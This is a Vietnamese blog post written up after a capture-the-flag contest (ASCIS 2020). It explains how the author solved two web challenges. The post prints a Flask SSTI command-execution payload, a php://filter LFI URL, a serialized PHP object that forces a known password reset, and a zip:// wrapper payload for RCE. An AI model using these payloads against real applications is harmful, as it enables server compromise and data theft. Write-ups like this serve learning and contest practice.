---
layout: post
title:  "Write Up ASCIS 2020 (SVATT-2020)"
date:   2020-11-02 15:11:53 +0700
categories: jekyll update
---
* Do not remove this line (it will not be displayed)
{:toc}

# **I.Mở đầu**
Đây là lần đầu tiên mình tham gia giải SVATTT vòng sơ khảo, và cũng thật bất ngờ khi lần tham gia đầu tiên này của mình lại có thể đạt được Giải 3 chung cuộc . Mặc dù, Team mình không may mắn khi chỉ đứng ở vị trí `top 12`, không được tham dự vòng Chung Khảo nhưng mình cũng phần hài lòng về kết quả này.
![bxh](/assets/svattt2020/bxh.png)
![team](/assets/svattt2020/team-details.png)
- Giải lần này team mình giải được 2/4 bài web, và sau đây mình sẽ trình bày qua về ý tưởng cũng như cách giải.

# **II.TSULOTT3**
![ques1](/assets/svattt2020/ques1.png)
- Với bài đầu tiên này, tác giả sẽ cho bạn source code của phía server được dựng với Flask. Cùng nhìn qua source code này nào:
{% highlight ruby %}
from flask import Flask, session, request, render_template, render_template_string
from flask_session import Session
from random import randint as ri

app = Flask(__name__)
SESSION_TYPE = 'filesystem'
app.config.from_object(__name__)
Session(app)
cheat = "Pls Don't cheat! "

def check_session(input):
	if session.get(input) == None:
		return ""
	return session.get(input)

@app.route("/", methods=["GET","POST"])
def index():
	try:
		session.pop("name")
		session.pop("jackpot")
	except:
		pass
	if request.method == "POST":
		ok = request.form['ok']
		session["name"] = request.form['name']
		if ok == "Go":
			session["check"] = "access"
			jackpot = " ".join(str(x) for x in [ri(10,99), ri(10,99), ri(10,99), ri(10,99), ri(10,99), ri(10,99)]).strip()
			session["jackpot"] = jackpot
			return render_template_string("Generating jackpot...<script>setInterval(function(){ window.location='/guess'; }, 500);</script>")
	return render_template("start.html")

@app.route('/guess', methods=["GET","POST"])
def guess():
	print(session)
	try:
		if check_session("check") == "":
			return render_template_string(cheat+check_session("name"))
		else:
			if request.method == "POST":
				jackpot_input = request.form['jackpot']
				if jackpot_input == check_session("jackpot"):
					mess = "Really? GG "+check_session("name")+", here your flag: ASCIS{xxxxxxxxxxxxxxxxxxxxxxxxx}"
				elif jackpot_input != check_session("jackpot"):
					mess = "May the Luck be with you next time!<script>setInterval(function(){ window.location='/reset_access'; }, 1200);</script>"
				return render_template_string(mess)
			return render_template("guess.html")
	except:
		pass
	return render_template_string(cheat+check_session("name"))


@app.route('/reset_access')
def reset():
	try:
		session.pop("check")
		return render_template_string("Reseting...<script>setInterval(function(){ window.location='/'; }, 500);</script>")
	except:
		pass
	return render_template_string(cheat+check_session("name"))


if __name__ == "__main__":
	app.secret_key = 'tsudepzaivlhihihi'
	app.run()
{% endhighlight %}

- Vậy là phía server sẽ có 3 route chính, trong đó:
  - Router: `/` Mỗi lần đến route này, session sẽ được làm mới với `name` được nhập vào từ form. Sau đó, `jackpot` random 6 số, set session['check']='ok' và gắn cùng với session đó, sau đó redirect sang route `guess`.
  - Router: `/guess` có 2 vai trò chính:
    - Nếu xảy ra lỗi hoặc session['check'] bằng rỗng thì render template lỗi với name tương ứng.
    - Ngược lại, bạn sẽ được nhập 6 số , nếu trúng với 6 số  được random => Bạn sẽ có được flag.

- Chúng ta cùng chú ý đến phần check điều kiện `ok`:
![weakness](/assets/svattt2020/weakness.png)
Vậy là chỉ khi nào biến `ok == "Go"` thì session['check'] mới được set trong khi `session['name']` thì ngược lại. Nếu chúng ta thử cho `ok != "Go"` thì sao?

`POST name='test'&ok='' trong router / ` và sau đó `GET /guess` thì ta có kết quả như sau:
![test](/assets/svattt2020/test.png)
![test-result](/assets/svattt2020/test-result.png)

- Ngay khi bắt 1 số request để phân tích thông tin, mình thấy có khả năng trang này dính lỗi SSTI trên Flask. Nếu ai chưa biết về SSTI có thể tham khảo qua: `https://blog.nvisium.com/p255`.
- Để làm rõ những nghi hoặc trên, mình thử chạy local như sau:
`POST name='{{config}}'&ok='' trong router / ` và `GET /guess`:

![config](/assets/svattt2020/config.png)
![config-result](/assets/svattt2020/config-result.png)

-  Đến đây, gần như mọi thứ đã trở nên dễ  dàng. Tiếp theo chỉ cần RCE với payload dưới đây là có thể  lấy được flag:

{% highlight ruby %}
{% raw %}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% endraw %}
{% endhighlight %}

![re](/assets/svattt2020/re.png)
![re-result](/assets/svattt2020/re-result.png)

# **II. Among_us**
- Với bài among_us này, mình và thành viên trong team đã tốn khá nhiều thời gian để  có thể giải. Mình sẽ phân bài này ra 3 phase nhỏ để có giải quyết dễ hơn:
  - Phase 1: Lấy thông tin bằng LFI sử dụng PHP wrapper
  - Phase 2: Login
  - Phase 3: RCE để tìm flag

#### *1. Phase 1: Lấy thông tin bằng LFI sử dụng PHP wrapper*
- Payload `http://35.240.156.48/?page=php://filter/convert.base64-encode/resource=home`. Với cách này, chúng ta có thể lấy toàn bộ source code của những trang liên quan. Cấu trúc của trang này có những file sau:
  - index.php: Trang index, nhúng trong này có 2 file dbconnect và lib.php
  - home.php: Trang home, không cần quan tâm
  - lib.php: nơi các hàm được định nghĩa
  - dbconnect.php: nơi connect database, username, password
  - crew.php: Thống kê các user
  - forgot.php: Cung cấp khả năng reset password
  - electrical.php: Nơi upload file (yêu cầu đăng nhập)
  - cafeteria.php: (yêu cầu đăng nhập)
  - login.php: Login
  - med.php (yêu cầu đăng nhập)
  - o2.php (yêu cầu đăng nhập)
- Vậy là chúng ta đã có source code của toàn bộ website, điều cần làm bây giờ là tìm hướng đi để khai thác. Sau khi đọc code, mình có thể thấy khả năng sẽ sử dụng tính năng upload file trong electrical.php để thực hiện RCE. Tuy nhiên, chúng ta cần đăng nhập => Cùng chuyển đến phase thứ 2.
#### *2. Phase 2: Login*
- Với việc login, sau khi đọc code của login: 
{% highlight ruby %}
if(isset($_POST["username"]) && !empty($_POST["username"]) && isset($_POST["password"]) && !empty($_POST["password"]))
{
		if($_SESSION["form_token"]===$_POST["token"]) {
			unset($_SESSION['form_token']);
			$_SESSION["form_token"] = md5(uniqid(rand(), true));

			$count = check_user_exists($conn, $_POST["username"]);
			if($count === 1)
			{	
				if(md5($_POST["password"]) === get_password($conn, $_POST["username"]))
				{
					$_SESSION["user"] = $_POST["username"];
					header("Refresh:0");
				}
				else 
				{
					print("<center>IMPOSTOR ALERT!!!</center>");
				}
			}
			else
			{
				print("<center>IMPOSTOR ALERT!!!</center>");
			}
		}
}
{% endhighlight %}
Có vẻ là việc bypass login có vẻ là bất khả thi, sau đó, mình chú ý đến tính năng forgot password của website.
{% highlight ruby %}
if(isset($_POST["ticket"]) && !empty($_POST["ticket"]))
{
		if($_SESSION["form_token"]===$_POST["token"]) {
			unset($_SESSION['form_token']);
			$_SESSION["form_token"] = md5(uniqid(rand(), true));
			$ticket = unserialize(base64_decode($_POST["ticket"]));
			$username = $ticket->name;
			$secret_number = $ticket->secret_number;
			$count = check_user_exists($conn, $username);
			if($count === 1)
			{	
				if(check_length($secret_number, 9)) {
					$secret_number = strtoupper($secret_number);
					$secret_number = check_string($secret_number);
					$secret = get_secret($conn,$username);
					if($secret_number !== $secret) {
						print("Wrong secret!");
					}
					else
					{
					print("OK, we will send you the new password");}
					// reset
					$random_rand = rand(0,$secret_number);
					srand($random_rand);
					$new_password = "";
					while(strlen($new_password) < 30) {
						$new_password .= strval(rand());
					}
					reset_password($conn, $username, $new_password);
					//to do: send mail the new password to the user, code later
					//print($new_password);
				}
				else
				{
					print("<center>IMPOSTOR ALERT!!!!</center>");
				}
			}
			else
			{
				print("2");
			}
		}
		else
		{
			print("1");
		}
}
{% endhighlight %}

- Điều thứ nhất, tính năng forgot password sẽ yêu cầu 1 `secret_number` gồm 9 chữ số (phải base64encode) để có thể reset password. Tuy nhiên, lỗi typo đã khiến cho mặc dù secret_number không đúng nhưng vấn reset password. 
{% highlight ruby %}
if($secret_number !== $secret) {
	print("Wrong secret!");
}
else
{
print("OK, we will send you the new password");}
// reset
$random_rand = rand(0,$secret_number);
{% endhighlight %}
- Thứ 2, Chúng ta có thể sử dụng serialize để chèn secret_number đi kèm username thông qua Class ở trong `lib.php`:
{% highlight ruby %}
class CrewMate {
	public $name;
	public $secret_number;
}
{% endhighlight %}
- Thứ 3, password mới sẽ được random từ `secret_number` nhập vào. Sau khi tìm hiểu theo hàm `rand()` của PHP sẽ xảy ra trường hợp khi `rand(0,null)=0`. Nếu vậy, ta có thể đổi `secret_number` thành 1 array, sau khi qua hàm strtoupper, nó sẽ trở thành `NULL`, và sau đó, password được reset mới sẽ có thể bị ta khống chế.
{% highlight ruby %}
$secret_number= [1,2,3,4,5,6,7,8,9];
$random_rand = rand(0,$secret_number);
srand($random_rand);
$new_password = "";
while(strlen($new_password) < 30) {
	$new_password .= strval(rand());
}   
echo($new_password); 
{% endhighlight %}
Password được reset: `117856802212731241191535857466`
- Payload để truyền `secret_number`:  
`O:8:"CrewMate":2:{s:4:"name";s:8:"john_doe";s:13:"secret_number";a:9:{i:0;s:1:"0";i:1;s:1:"e";i:2;s:1:"1";i:3;s:1:"2";i:4;s:1:"3";i:5;s:1:"4";i:6;s:1:"5";i:7;s:1:"6";i:8;s:1:"7";}} (nhớ base64encode)`. Tên `john_doe` có thể lấy từ trang crew (ko cần đăng nhập). 	

=> Vậy là chúng ta đã có thể đăng nhập, tiến đến bước RCE.
#### *3. Phase 3: RCE tìm flag*
- Trên trang upload của `electrical.php`:
{% highlight ruby %}
function upload($file) {
	if(isset($file))
	{
		if($file["size"] > 1485760) {
			die('<center>IMPOSTOR ALERT!!!</center>');
		}	
		$uploadfile=$file["tmp_name"];
		$folder="crew_upload/";
		$file_name=$file["name"];
		$new = $file["tmp_name"].$file_name;
		move_uploaded_file($file["tmp_name"], $new);
		$zip = new ZipArchive(); 
		$zip_name ="crew_upload/".md5(uniqid(rand(), true)).".zip"; // Zip name
		if($zip->open($zip_name, ZIPARCHIVE::CREATE)!==TRUE)
		{ 
		 	echo "Sorry ZIP creation failed at this time";
		}
		$zip->addFile($new);
		$zip->close();
		if(isset($_SESSION["link"]) && !empty($_SESSION["link"])) {
			unlink($_SESSION["link"]);
			unset($_SESSION["link"]);
		}
		$_SESSION["link"] = $zip_name;
		header("Refresh: 0");
	}
}
{% endhighlight %}
- File sẽ được update vào folder `crew_upload`, random tên file bất kì và nén vào file zip. Đến đây, việc khai thác RCE sẽ sử dụng zip wrapper. Tham khảo `https://www.corben.io/zip-to-rce-lfi/`, payload sẽ có dạng `http://127.0.0.1/?page=zip:///crew_upload/43cf9e8a4f6c464d12e6d64d56cb16ce.jpg%23/tmp/phppirTVd1` với phần `/tmp/phppirTVd1` được lưu đồng thời trong `/tmp` sau khi đẩy lên.
- Đến đây, mình đã nghĩ là dễ dàng để lấy flag, tuy nhiên, tác giả đã khá 'quái' khi để flag ở trong db. Và cuối cùng, tới gần 5h chiều, mình mới lấy được flag để submit:
![flag](/assets/svattt2020/flag.png)

# **IV. Kết**
- Đây là đoạn write-up đầu tiên trong blog của mình. Mình mong blog này sẽ chính là nơi chia sẻ kinh nghiệm, kiến thức và cũng đồng thời là nơi mình có thể lưu trữ, tra cứu trong những trường hợp cần thiết. Nếu có bất kì vấn đề, góp ý nào về đoạn write-up này, mng có thể liên hệ với mình theo thông tin bên dưới. Cảm ơn vì đã đọc!